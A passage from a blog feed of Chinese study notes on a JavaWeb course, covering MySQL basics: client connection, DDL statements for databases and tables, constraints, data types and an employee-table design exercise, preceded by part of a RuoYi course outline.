<h3 id="基础应用部分"><a class="header-anchor" href="#基础应用部分">¶</a>基础应用部分</h3>
<ul>
<li>若伊搭建</li>
<li>入门案例</li>
<li>功能详解</li>
<li>项目结构</li>
<li>源码阅读</li>
<li>二次开发</li>
<li>通义灵码AI工具</li>
</ul>
<h3 id="项目实战部分"><a class="header-anchor" href="#项目实战部分">¶</a>项目实战部分</h3>
<ul>
<li>帝可得-项目搭建</li>
<li>帝可得-前端页面</li>
<li>帝可得-点位管理</li>
<li>帝可得-人员管理</li>
<li>帝可得-设备管理</li>
<li>AI优化代码</li>
<li>AI生成代码</li>
<li>AI代码调错</li>
</ul>
<h3 id="拔高原理部分"><a class="header-anchor" href="#拔高原理部分">¶</a>拔高原理部分</h3>
<ul>
<li>若伊框架的核心原理和底层运行机制分析</li>
<li>Velocity代码生成器</li>
<li>RBAC权限控制</li>
<li>异步任务管理器</li>
<li>自定义日志注解</li>
<li>AI生成注释</li>
<li>AI辅助阅读</li>
</ul>
<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
<ul>
<li>关系型数据库 MySQL</li>
<li>非关系型数据库Redis</li>
<li>后端
<ul>
<li>Springboot</li>
<li>MyBatis</li>
</ul>
</li>
<li>前端
<ul>
<li>Vue3</li>
<li>Axios</li>
<li>Element-Plus</li>
</ul>
</li>
<li>工具
<ul>
<li>IDEA、VSCode</li>
<li>Git</li>
</ul>
</li>
<li>AI+若伊
<ul>
<li>全栈开发</li>
</ul>
</li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>以后真的全栈3k吧hhhhhh</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>RuoYi notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>RuoYi</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day06--MySQL</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day06--MySQL/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></p>
</li>
<li>
<p>需要记录的内容的标准：</p>
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>
<p>按照期末考前的笔记选择标准来记：</p>
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>
<p>努力克服完美强迫症</p>
</li>
<li>
<p><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></p>
</li>
<li>
<p><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></p>
</li>
</ul>
<h2 id="Day06-MySQL"><a class="header-anchor" href="#Day06-MySQL">¶</a>Day06-MySQL</h2>
<ul>
<li>
<p>连接：<code>mysql -u用户名 -p密码 [-h数据库服务器的IP地址 -P端口号]</code></p>
<blockquote>
<p>-h  参数不加，默认连接的是本地 127.0.0.1 的MySQL服务器</p>
<p>-P  参数不加，默认连接的端口号是 3306</p>
</blockquote>
</li>
</ul>
<h3 id="MySQL概述"><a class="header-anchor" href="#MySQL概述">¶</a>MySQL概述</h3>
<h4 id="了解一下：企业使用方式"><a class="header-anchor" href="#了解一下：企业使用方式">¶</a>了解一下：企业使用方式</h4>
<ul>
<li>
<p>在真实的企业开发中，MySQL数据库服务器是不在我们本地安装，在公司的服务器上安装的，服务器还需要放置在专门的IDC机房中</p>
</li>
<li>
<p>IDC机房需要保证恒温、恒湿、恒压，而且还要保证网络、电源的可靠性(备用电源及网络)</p>
</li>
<li>
<p>要使用服务器上的这台MySQL服务器，就需要在pc上去远程连接这台MySQL</p>
</li>
<li>
<p>服务器上安装的MySQL数据库，项目组的其他开发人员也访问</p>
</li>
<li>
<p>提前体验一下企业中数据库的使用方式：借助于VMware虚拟机</p>
<ul>
<li>在Vmware虚拟机上在安装一个服务器操作系统Linux，然后再在Linux服务器上安装各种企业级软件</li>
</ul>
</li>
</ul>
<h4 id="数据模型"><a class="header-anchor" href="#数据模型">¶</a>数据模型</h4>
<h5 id="关系型数据库"><a class="header-anchor" href="#关系型数据库">¶</a>关系型数据库</h5>
<ul>
<li><strong>概念</strong>：建立在关系模型基础上，由多张相互连接的<strong>二维表</strong>组成的数据库</li>
</ul>
<h5 id="二维表的优点"><a class="header-anchor" href="#二维表的优点">¶</a>二维表的优点</h5>
<ul>
<li>使用表存储数据，格式统一，便于<strong>维护</strong></li>
<li>使用SQL语言操作，标准统一，使用方便，可用于<strong>复杂查询</strong></li>
</ul>
<blockquote>
<p>MySQL、Oracle、DB2、SQLServer都属于关系型数据库，都基于二维表存储数据</p>
<p>结论：基于二维表存储数据的数据库就成为关系型数据库</p>
<p>非基于二维表存储数据的数据库，就是非关系型数据库（如Redis）</p>
</blockquote>
<h5 id="数据模型-v2"><a class="header-anchor" href="#数据模型-v2">¶</a>数据模型</h5>
<ul>
<li>通过<code>MySQL</code>客户端连接<strong>数据库管理系统</strong><code>DBMS</code>，然后通过<code>DBMS</code>操作<strong>数据库</strong></li>
<li>使用<code>MySQL</code>客户端，向数据库管理系统发送一条<code>SQL</code>语句，由数据库管理系统根据<code>SQL</code>语句指令去操作数据库中的表结构及数据</li>
<li>一个数据<strong>库</strong>服务器中可以创建多个数据库，一个数据库中也可以包含多张<strong>表</strong>，而一张表中又可以包含多行<strong>记录</strong></li>
</ul>
<blockquote>
<p>在Mysql数据库服务器当中存储数据：</p>
<ol>
<li>创建数据库（可以创建多个数据库，之间相互独立）</li>
<li>数据库下再创建数据表（一个数据库下可以创建多张表）</li>
<li>将数据存放在数据表中（一张表可以存储多行数据）</li>
</ol>
</blockquote>
<h4 id="SQL简介"><a class="header-anchor" href="#SQL简介">¶</a>SQL简介</h4>
<ul>
<li>SQL</li>
</ul>
<blockquote>
<p>结构化查询语言</p>
<p>一门操作关系型数据库的编程语言，定义操作所有关系型数据库的统一标准</p>
</blockquote>
<h5 id="SQL通用语法"><a class="header-anchor" href="#SQL通用语法">¶</a>SQL通用语法</h5>
<ul>
<li>SQL语句可以单行或多行书写，以分号结尾</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span></span><br><span class="line">database</span><br><span class="line">ahahahahah</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> database ahahahahah;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>SQL语句可以使用空格/缩进来增强语句的可读性</p>
</li>
<li>
<p>MySQL数据库的SQL语句不区分大小写</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure>
<ul>
<li>注释：
<ul>
<li>单行注释：<code>-- 注释内容</code>   或   <code># 注释内容</code>(MySQL特有)</li>
<li>多行注释：<code>/* 注释内容 */</code></li>
</ul>
</li>
</ul>
<h5 id="分类"><a class="header-anchor" href="#分类">¶</a>分类</h5>
<ul>
<li>SQL语句根据其功能被分为四大类：<code>DDL</code>、<code>DML</code>、<code>DQL</code>、<code>DCL</code></li>
</ul>
<table>
<thead>
<tr>
<th>分类</th>
<th>全称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>DDL</td>
<td>Data Definition Language</td>
<td>数据定义语言，用来定义数据库对象(数据库，表，字段)</td>
</tr>
<tr>
<td>DML</td>
<td>Data Manipulation Language</td>
<td>数据操作语言，用来对数据库表中的数据进行增删改</td>
</tr>
<tr>
<td>DQL</td>
<td>Data Query Language</td>
<td>数据查询语言，用来查询数据库中表的记录</td>
</tr>
<tr>
<td>DCL</td>
<td>Data Control Language</td>
<td>数据控制语言，用来创建数据库用户、控制数据库的访问权限</td>
</tr>
</tbody>
</table>
<h3 id="数据库设计-DDL"><a class="header-anchor" href="#数据库设计-DDL">¶</a>数据库设计-DDL</h3>
<h4 id="项目开发流程"><a class="header-anchor" href="#项目开发流程">¶</a>项目开发流程</h4>
<ol>
<li>
<p>需求文档</p>
<ol>
<li>开发一个项目 / 项目当中的某个模块之前，会先会拿到产品经理提供的<strong>页面原型及需求文档</strong></li>
</ol>
</li>
<li>
<p>设计</p>
<ol>
<li>拿到产品原型和需求文档之后，首先不是编码，而是先进行项目的设计
<ol>
<li>包括：<strong>概要设计</strong>、<strong>详细设计</strong>、<strong>接口设计</strong>、<strong>数据库设计</strong>等</li>
</ol>
</li>
<li>数据库设计根据产品原型以及需求文档，要分析<strong>各个模块涉及到的表结构</strong>以及<strong>表结构之间的关系</strong>，以及<strong>表结构的详细信息</strong>。</li>
<li>最终将数据库以及数据库当中的表结构设计<strong>创建</strong>出来</li>
</ol>
</li>
<li>
<p>开发 / 测试</p>
<ol>
<li>参照页面原型和需求进行编码，<strong>实现业务功能</strong></li>
<li>操作设计出来的<strong>数据库表结构</strong>，完成业务的<strong>增删改查操作</strong>等</li>
</ol>
</li>
<li>
<p>部署上线</p>
<ol>
<li>项目的<strong>功能开发测试</strong>完成之后，项目可以上线运行</li>
<li>后期如果项目遇到<strong>性能瓶颈</strong>，还需要对项目进行<strong>优化</strong></li>
<li>优化很重要的一个部分就是<strong>数据库的优化</strong></li>
<li>包括：数据库中<strong>索引的建立</strong>、<strong>SQL 的优化</strong>、<strong>分库分表</strong>等操作</li>
</ol>
</li>
</ol>
<h5 id="项目开发流程中数据库的三个阶段"><a class="header-anchor" href="#项目开发流程中数据库的三个阶段">¶</a>项目开发流程中数据库的三个阶段</h5>
<ol>
<li>数据库<strong>设计</strong>阶段</li>
</ol>
<ul>
<li>参照页面原型以及需求文档<u>设计数据库表结构</u></li>
</ul>
<ol start="2">
<li>数据库<strong>操作</strong>阶段</li>
</ol>
<ul>
<li>根据业务功能的实现，<u>编写SQL语句</u>对数据表中的数据<u>进行增删改查操作</u></li>
</ul>
<ol start="3">
<li>数据库<strong>优化</strong>阶段</li>
</ol>
<ul>
<li>通过数据库的优化来提高数据库的访问性能</li>
<li>优化手段：<u>索引</u>、<u>SQL优化</u>、<u>分库分表</u>等</li>
</ul>
<h4 id="数据库操作"><a class="header-anchor" href="#数据库操作">¶</a>数据库操作</h4>
<ul>
<li>进行数据库设计，使用DDL语句</li>
<li>全称：Data Definition Language(数据定义语言)，用来<strong>定义</strong>数据库对象(数据库、表)</li>
<li>常见操作：<u>查询、创建、使用、删除</u></li>
</ul>
<h5 id="查询数据库"><a class="header-anchor" href="#查询数据库">¶</a>查询数据库</h5>
<h6 id="查询所有数据库"><a class="header-anchor" href="#查询所有数据库">¶</a>查询所有数据库</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure>
<h6 id="查询当前数据库"><a class="header-anchor" href="#查询当前数据库">¶</a>查询当前数据库</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>
<ul>
<li>执行效果
<ul>
<li>返回<code>NULL</code>：表示当前没有使用任何数据库</li>
<li>返回<code>xxx数据库</code>：正在使用xxx数据库</li>
</ul>
</li>
</ul>
<blockquote>
<p>操作某一个数据库，必须要切换到对应的数据库中。</p>
<p>通过：select  database() ，就可查询到当前所处的数据库</p>
</blockquote>
<h5 id="创建数据库"><a class="header-anchor" href="#创建数据库">¶</a>创建数据库</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 数据库不存在,则创建该数据库；如果存在则不创建</span></span><br><span class="line"><span class="keyword">create</span> database [ if <span class="keyword">not</span> <span class="keyword">exists</span> ] 数据库名;</span><br></pre></td></tr></table></figure>
<ul>
<li>在同一个数据库服务器中，不能创建两个名称相同的数据库，否则将会报错</li>
</ul>
<h5 id="使用数据库"><a class="header-anchor" href="#使用数据库">¶</a>使用数据库</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use 数据库名;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>要操作某一个数据库下的表时，就需要通过该指令，切换到对应的数据库下，否则不能操作</p>
</blockquote>
<h5 id="删除数据库"><a class="header-anchor" href="#删除数据库">¶</a>删除数据库</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [ if <span class="keyword">exists</span> ] 数据库名;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果删除一个不存在的数据库，将会报错</p>
<p>可以加上参数 if exists ，如果数据库存在，再执行删除，否则不执行删除</p>
</blockquote>
<blockquote>
<p>说明：上述语法中的database，也可以替换成 schema</p>
<p>如：create schema db01;</p>
<p>如：show schemas;</p>
</blockquote>
<h4 id="图形化工具"><a class="header-anchor" href="#图形化工具">¶</a>图形化工具</h4>
<ul>
<li>目前主流图形化界面工具：
<ul>
<li>SQLyog</li>
<li>Navicat</li>
<li>DataGrip</li>
<li>IDEA</li>
</ul>
</li>
</ul>
<h5 id="连接数据库"><a class="header-anchor" href="#连接数据库">¶</a>连接数据库</h5>
<ul>
<li>因为DataGrip已经集成到IDEA，所以直接用IDEA作为操作MySQL的图形化界面工具</li>
</ul>
<ol>
<li>
<p><code>IDEA</code>→<code>View</code>→<code>Tool Windows</code>→<code>Database</code></p>
</li>
<li>
<p>配置MySQL</p>
<ol>
<li><code>+</code>→<code>Data Source</code>→<code>MySQL</code></li>
</ol>
</li>
<li>
<p>输入相关信息</p>
<ol>
<li>当前连接名字、备注信息、数据库服务器的IP地址、端口号、<code>MySQL</code>登录名、登录密码</li>
<li>点击<code>Download</code>下载<code>MySQL</code>连接驱动</li>
</ol>
</li>
<li>
<p>测试数据库连接</p>
<ol>
<li>点击<code>Test Connection</code></li>
</ol>
</li>
<li>
<p>连接测试通过后保存配置</p>
</li>
</ol>
<h5 id="操作数据库"><a class="header-anchor" href="#操作数据库">¶</a>操作数据库</h5>
<h6 id="创建数据库-v2"><a class="header-anchor" href="#创建数据库-v2">¶</a>创建数据库</h6>
<ol>
<li>右键数据库</li>
<li><code>New</code>→<code>Schema</code></li>
<li>设置数据库名字</li>
</ol>
<blockquote>
<p>有了图形化界面工具后，就可以方便的使用图形化工具：创建数据库，创建表、修改表等DDL操作</p>
<p>工具底层也是通过DDL语句操作的数据库，只不过这些SQL语句是图形化界面工具自动完成的</p>
</blockquote>
<h6 id="查看所有数据库"><a class="header-anchor" href="#查看所有数据库">¶</a>查看所有数据库</h6>
<ul>
<li>在console中输入：<code>show databases;</code></li>
</ul>
<h4 id="表操作"><a class="header-anchor" href="#表操作">¶</a>表操作</h4>
<ul>
<li>包含四个部分：<code>创建表</code>、<code>查询表</code>、<code>修改表</code>、<code>删除表</code></li>
</ul>
<h5 id="创建"><a class="header-anchor" href="#创建">¶</a>创建</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>  表名(</span><br><span class="line">    字段<span class="number">1</span>  字段<span class="number">1</span>类型 [约束]  [comment  字段<span class="number">1</span>注释 ],</span><br><span class="line">    字段<span class="number">2</span>  字段<span class="number">2</span>类型 [约束]  [comment  字段<span class="number">2</span>注释 ],</span><br><span class="line">    ......</span><br><span class="line">    字段n  字段n类型 [约束]  [comment  字段n注释 ] </span><br><span class="line">) [ comment  表注释 ] ;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意： [ ] 中的内容为可选参数； 最后一个字段后面没有逗号</p>
</blockquote>
<h6 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h6>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>name</th>
<th>age</th>
<th>gender</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>qingyifuwang</td>
<td>韦一笑</td>
<td>45</td>
<td>男</td>
</tr>
<tr>
<td>2</td>
<td>baimeiyingwang</td>
<td>殷天正</td>
<td>55</td>
<td>男</td>
</tr>
<tr>
<td>3</td>
<td>jinmaoshiwang</td>
<td>谢逊</td>
<td>50</td>
<td>男</td>
</tr>
<tr>
<td>4</td>
<td>zishanlongwang</td>
<td>黛绮丝</td>
<td>38</td>
<td>女</td>
</tr>
</tbody>
</table>
<ul>
<li>建表语句</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user (</span><br><span class="line">	id <span class="type">int</span> comment <span class="string">&#x27;ID,唯一标识&#x27;</span>,  <span class="comment">-- id是一行数据的唯一标识（不能重复）</span></span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">    gender <span class="type">char</span>(<span class="number">1</span>) comment <span class="string">&#x27;性别&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;用户表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>数据表创建完成后，再测试能否往表中存储数据</li>
</ul>
<h6 id="约束"><a class="header-anchor" href="#约束">¶</a>约束</h6>
<ul>
<li>
<p>作用在表中字段上的规则，用于限制存储在表中的数据</p>
</li>
<li>
<p>保证数据库当中数据的正确性、有效性和完整性</p>
</li>
<li>
<p>MySQL提供了5种约束：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>约束</th>
<th>描述</th>
<th>关键字</th>
</tr>
</thead>
<tbody>
<tr>
<td>非空约束</td>
<td>限制该字段值不能为null</td>
<td>not null</td>
</tr>
<tr>
<td>唯一约束</td>
<td>保证所有字段的所有数据都是唯一、不重复的</td>
<td>unique</td>
</tr>
<tr>
<td>主键约束</td>
<td>主键是一行数据的唯一标识，要求非空且唯一</td>
<td>primary key</td>
</tr>
<tr>
<td>默认约束</td>
<td>保存数据时，如果未指定该字段值，则采用默认值</td>
<td>default</td>
</tr>
<tr>
<td>外键约束</td>
<td>让两张表的数据建立连接，保证数据的一致性和完整性</td>
<td>foreign key</td>
</tr>
</tbody>
</table>
<blockquote>
<p>约束是作用于表中字段上的，可以在创建表/修改表的时候添加约束</p>
</blockquote>
<ul>
<li>使用约束后重新创建上表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user (</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key comment <span class="string">&#x27;ID,唯一标识&#x27;</span>),</span><br><span class="line">	username <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">	name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">	age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">	gender <span class="type">char</span>(<span class="number">1</span>) <span class="keyword">default</span> <span class="string">&#x27;男&#x27;</span> comment <span class="string">&#x27;性别&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;用户表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>主键自增：<code>auto_increment</code> 自动增长</p>
<blockquote>
<p>每次插入新的行记录时，数据库自动生成id字段(主键)下的值</p>
<p>具有auto_increment的数据列是一个正数序列开始增长(从1开始自增)</p>
</blockquote>
</li>
<li>
<p>使用主键自增后调整创建表语句</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user (</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID,唯一标识&#x27;</span>), <span class="comment">-- 主键自动增长</span></span><br><span class="line">	<span class="comment">-- ......同上</span></span><br></pre></td></tr></table></figure>
<h6 id="数据类型"><a class="header-anchor" href="#数据类型">¶</a>数据类型</h6>
<ul>
<li>
<p>MySQL中数据类型主要分为三类：<code>数值类型</code>、<code>字符串类型</code>、<code>日期时间类型</code></p>
</li>
<li>
<p>数值类型</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>有符号(SIGNED)范围</th>
<th>无符号(UNSIGNED)范围</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1byte</td>
<td>(-128，127)</td>
<td>(0，255)</td>
<td>小整数值</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2bytes</td>
<td>(-32768，32767)</td>
<td>(0，65535)</td>
<td>大整数值</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3bytes</td>
<td>(-8388608，8388607)</td>
<td>(0，16777215)</td>
<td>大整数值</td>
</tr>
<tr>
<td>INT/INTEGER</td>
<td>4bytes</td>
<td>(-2147483648，2147483647)</td>
<td>(0，4294967295)</td>
<td>大整数值</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8bytes</td>
<td>(-2^63， 2^63-1)</td>
<td>(0，2^64-1)</td>
<td>极大整数值</td>
</tr>
<tr>
<td>FLOAT</td>
<td>4bytes</td>
<td>(-3.402823466 E+38，3.402823466351 E+38)</td>
<td>0 和 (1.175494351 E-38，3.402823466 E+38)</td>
<td>单精度浮点数值</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8bytes</td>
<td>(-1.7976931348623157 E+308，1.7976931348623157 E+308)</td>
<td>0 和 (2.2250738585072014 E-308，1.7976931348623157 E+308)</td>
<td>双精度浮点数值</td>
</tr>
<tr>
<td>DECIMAL</td>
<td></td>
<td>依赖于M(精度)和D(标度)的值</td>
<td>依赖于M(精度)和D(标度)的值</td>
<td>小数值(精确定点数)</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 示例</span></span><br><span class="line">	<span class="comment">-- 年龄字段 → 不会出现负数，且人的年龄不会太大</span></span><br><span class="line">	age tinyint unsigned</span><br><span class="line">	</span><br><span class="line">	<span class="comment">-- 分数 → 总分100分，最多出现一位小数</span></span><br><span class="line">	score <span class="keyword">double</span>(<span class="number">4</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>字符串类型</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR</td>
<td>0-255 bytes</td>
<td>定长字符串(需要指定长度)</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>0-65535 bytes</td>
<td>变长字符串(需要指定长度)</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-255 bytes</td>
<td>不超过255个字符的二进制数据</td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>0-255 bytes</td>
<td>短文本字符串</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-65 535 bytes</td>
<td>二进制形式的长文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-65 535 bytes</td>
<td>长文本数据</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0-16 777 215 bytes</td>
<td>二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0-16 777 215 bytes</td>
<td>中等长度文本数据</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0-4 294 967 295 bytes</td>
<td>二进制形式的极大文本数据</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0-4 294 967 295 bytes</td>
<td>极大文本数据</td>
</tr>
</tbody>
</table>
<blockquote>
<p>char 与 varchar 都可以描述字符串</p>
<p>char是定长字符串，指定长度多长，就占用多少个字符，和字段值的长度无关</p>
<p>varchar是变长字符串，指定的长度为最大占用长度</p>
<p>相对来说，char的性能会更高些</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 示例：</span></span><br><span class="line">	<span class="comment">-- 用户名 username → 长度不足，最长不会超过50</span></span><br><span class="line">	username <span class="type">varchar</span>(<span class="number">50</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">-- 手机号 phone → 固定长度为11</span></span><br><span class="line">	phone <span class="type">char</span>(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>日期时间类型</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>范围</th>
<th>格式</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td>3</td>
<td>1000-01-01 至 9999-12-31</td>
<td>YYYY-MM-DD</td>
<td>日期值</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838:59:59 至 838:59:59</td>
<td>HH:MM:SS</td>
<td>时间值或持续时间</td>
</tr>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901 至 2155</td>
<td>YYYY</td>
<td>年份值</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00 至 9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>混合日期和时间值</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>1970-01-01 00:00:01 至 2038-01-19 03:14:07</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>混合日期和时间值，时间戳</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 示例</span></span><br><span class="line">	<span class="comment">-- 生日字段 birthday 生日只需要年月日</span></span><br><span class="line">	birthday <span class="type">date</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">-- 创建时间 creatime 需要精确到时分秒</span></span><br><span class="line">	createtime datetime</span><br></pre></td></tr></table></figure>
<h6 id="案例"><a class="header-anchor" href="#案例">¶</a>案例</h6>
<ul>
<li>
<p>需求：根据产品原型/需求创建表((设计合理的数据类型、长度、约束)</p>
</li>
<li>
<p>2 新增员工</p>
</li>
<li>
<p>2.1 点击新增员工，会打开新增员工的页面</p>
</li>
<li>
<p>2.2 字段限制说明</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>字段名称</th>
<th>必填/选填</th>
<th>类型</th>
<th>长度限制</th>
<th>输入限制</th>
<th>是否唯一</th>
<th>提示话术</th>
</tr>
</thead>
<tbody>
<tr>
<td>用户名</td>
<td>必填</td>
<td>输入框</td>
<td>2-20</td>
<td>数字、字母</td>
<td>是</td>
<td>当前用户名已存在，请重新输入</td>
</tr>
<tr>
<td>员工姓名</td>
<td>必填</td>
<td>输入框</td>
<td>2-10</td>
<td>汉字</td>
<td>否</td>
<td>-</td>
</tr>
<tr>
<td>性别</td>
<td>必填</td>
<td>下拉框</td>
<td>-</td>
<td>选择 男/女</td>
<td>否</td>
<td>-</td>
</tr>
<tr>
<td>图像</td>
<td>选填</td>
<td>图片上传</td>
<td>2M</td>
<td>图片大小不能超过2M</td>
<td>否</td>
<td>图片过大，上传失败</td>
</tr>
<tr>
<td>职位</td>
<td>选填</td>
<td>下拉框</td>
<td>-</td>
<td>选择 班主任/讲师/学工主管/教研主管</td>
<td>否</td>
<td>-</td>
</tr>
<tr>
<td>入职日期</td>
<td>选填</td>
<td>日期选择组件</td>
<td>-</td>
<td>格式为：xxxx-xx-xx</td>
<td>否</td>
<td>-</td>
</tr>
<tr>
<td>归属部门</td>
<td>选填</td>
<td>下拉框</td>
<td>-</td>
<td>选择该员工所属的部门，关联的是部门表的数据</td>
<td>否</td>
<td>-</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>2.3 保存：判断必填项，是否填写，以及字段值是否符合要求，进行校验</p>
<ul>
<li>是→弹窗关闭，添加成功</li>
<li>否→红字提示未填写项</li>
</ul>
</li>
<li>
<p>2.4 员工图像上传</p>
<ul>
<li>选填；点击上传图片，上传本地图片；再次点击，修改图片</li>
<li>2.4.1 图片限制
<ul>
<li>图片大小不超过2M，仅能上传PNG JPG JPEG类型图片，建议上传200 * 200或300 * 300尺寸的图片</li>
</ul>
</li>
<li>2.4.2 异常提示
<ul>
<li>图片过大，上传失败</li>
<li>格式错误，上传失败</li>
</ul>
</li>
</ul>
</li>
<li>
<p>2.5 添加员工时，会给员工设置一个默认的密码 123456，添加完成后，员工就可以通过该密码登陆该后台管理系统</p>
</li>
<li>
<p>步骤：</p>
<ol>
<li>阅读产品原型及需求文档，看里面涉及到哪些字段</li>
<li>查看需求文档说明，确认各个<strong>字段的类型</strong>以及<strong>字段存储数据的长度限制</strong></li>
<li>在页面原型中描述的基础字段的基础上，再增加<strong>额外的基础字段</strong></li>
</ol>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp (</span><br><span class="line">	id <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">default</span> <span class="string">&#x27;123456&#x27;</span> comment <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span 